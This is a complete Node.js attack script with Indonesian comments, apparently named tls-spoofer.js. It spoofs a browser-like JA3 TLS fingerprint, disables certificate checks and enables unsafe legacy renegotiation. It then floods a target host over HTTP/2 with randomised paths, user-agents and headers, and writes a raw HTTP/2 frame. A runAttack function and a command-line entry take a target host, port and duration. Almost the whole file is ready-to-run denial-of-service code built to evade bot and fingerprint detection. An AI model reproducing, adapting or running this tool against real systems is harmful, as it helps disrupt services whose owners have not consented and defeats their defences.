const tls = require('tls');
const http2 = require('http2');
const crypto = require('crypto');

// Konfigurasi TLS untuk JA3 fingerprint spoofing
const ciphersList = [
  'TLS_AES_128_GCM_SHA256',
  'TLS_AES_256_GCM_SHA384',
  'TLS_CHACHA20_POLY1305_SHA256',
  'ECDHE-ECDSA-AES128-GCM-SHA256',
  'ECDHE-RSA-AES128-GCM-SHA256',
  'ECDHE-ECDSA-AES256-GCM-SHA384',
  'ECDHE-RSA-AES256-GCM-SHA384',
  'ECDHE-ECDSA-CHACHA20-POLY1305',
  'ECDHE-RSA-CHACHA20-POLY1305'
];
const ciphers = ciphersList.join(':');

const sigalgsList = [
  'ecdsa_secp256r1_sha256',
  'rsa_pss_rsae_sha256',
  'rsa_pkcs1_sha256',
  'ecdsa_secp384r1_sha384',
  'rsa_pss_rsae_sha384',
  'rsa_pkcs1_sha384',
  'rsa_pss_rsae_sha512',
  'rsa_pkcs1_sha512'
];
const sigalgs = sigalgsList.join(':');

const alpnProtocols = ['h2', 'http/1.1'];
const ecdhCurve = 'X25519:P-256:P-384:P-521';

const secureOptions =
  crypto.constants.SSL_OP_NO_SSLv2 |
  crypto.constants.SSL_OP_NO_SSLv3 |
  crypto.constants.SSL_OP_NO_TLSv1 |
  crypto.constants.SSL_OP_NO_TLSv1_1 |
  crypto.constants.ALPN_ENABLED |
  crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
  crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
  crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
  crypto.constants.SSL_OP_SINGLE_DH_USE |
  crypto.constants.SSL_OP_SINGLE_ECDH_USE |
  crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

// Utility random string untuk header request
function randStr(length) {
  const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let s = '';
  for (let i = 0; i < length; i++) {
    s += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return s;
}

// Buat TLS connection dengan opsi JA3 spoof
function createSpoofedTLS(host, port = 443, timeout = 5000) {
  const options = {
    host,
    port,
    servername: host,
    ciphers,
    sigalgs,
    ecdhCurve,
    ALPNProtocols: alpnProtocols,
    secureOptions,
    honorCipherOrder: true,
    rejectUnauthorized: false,
    timeout,
  };

  return tls.connect(options);
}

// Kirim HTTP/2 header spam ke server target
function sendH2HeaderSpam(tlsSocket, host, count = 10) {
  const client = http2.connect(`https://${host}`, { createConnection: () => tlsSocket });

  client.on('error', (e) => {
    // Abaikan atau log error
    console.log(`[!] HTTP/2 client error: ${e.message}`);
  });

  client.on('connect', () => {
    console.log(`[+] HTTP/2 client connected to ${host}`);
    for (let i = 0; i < count; i++) {
      const path = `/api/v${Math.floor(Math.random() * 10)}/${randStr(6)}`;
      const headers = {
        ':method': 'GET',
        ':path': path,
        ':scheme': 'https',
        ':authority': host,
        'user-agent': `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/` +
                      `${Math.floor(80 + Math.random() * 20)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36`,
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'x-requested-with': randStr(10),
        'x-request-id': `req_${randStr(16)}`,
      };

      const req = client.request(headers);
      req.setEncoding('utf8');
      
      req.on('response', (headers) => {
        console.log(`[+] Request ${i+1}/${count} sent - Status: ${headers[':status'] || 'unknown'}`);
      });
      
      req.on('data', () => {}); // Abaikan data response
      
      req.on('end', () => {
        req.close();
      });
      
      req.end();
    }
  });

  // Tutup client setelah delay
  setTimeout(() => {
    client.close();
    console.log('[*] HTTP/2 client closed');
  }, 3000);
}

// Kirim raw TLS payload
function sendRawPayload(tlsSocket, payload) {
  if (tlsSocket.writable) {
    tlsSocket.write(payload);
    console.log('[+] Raw payload sent successfully');
  } else {
    console.log('[!] Socket not writable, cannot send raw payload');
  }
}

// MAIN: contoh cara pakai dan gabung semua
function runAttack(host, port = 443, duration = 10) {
  console.log(`[*] Starting TLS attack on ${host}:${port} for ${duration} seconds`);
  
  // Hitung jumlah header berdasarkan durasi
  const headersPerSecond = 5;
  const totalHeaders = Math.floor(headersPerSecond * duration);
  
  const tlsSocket = createSpoofedTLS(host, port);

  tlsSocket.on('secureConnect', () => {
    console.log(`[+] TLS connected to ${host}:${port}`);

    // Kirim header spam HTTP/2
    sendH2HeaderSpam(tlsSocket, host, totalHeaders);

    // Contoh raw payload: PING frame HTTP/2
    const pingPayload = Buffer.from('0000000406', 'hex');
    sendRawPayload(tlsSocket, pingPayload);
  });

  tlsSocket.on('error', (err) => {
    console.error(`[!] TLS error: ${err.message}`);
  });

  // Set timeout berdasarkan durasi + buffer 5 detik
  const timeout = (duration + 5) * 1000;
  tlsSocket.setTimeout(timeout, () => {
    tlsSocket.destroy();
    console.log(`[*] Attack completed after ${duration} seconds`);
  });
}

// Export buat pemakaian modul
module.exports = {
  createSpoofedTLS,
  sendH2HeaderSpam,
  sendRawPayload,
  runAttack
};

// Menjalankan script secara langsung
if (require.main === module) {
  // Ambil parameter dari command line arguments
  const host = process.argv[2];
  const port = parseInt(process.argv[3], 10) || 443;
  const duration = parseInt(process.argv[4], 10) || 10;
  
  if (!host) {
    console.error('Usage: node tls-spoofer.js <host> [port] [duration]');
    console.error('Example: node tls-spoofer.js example.com 443 30');
    process.exit(1);
  }
  
  runAttack(host, port, duration);
}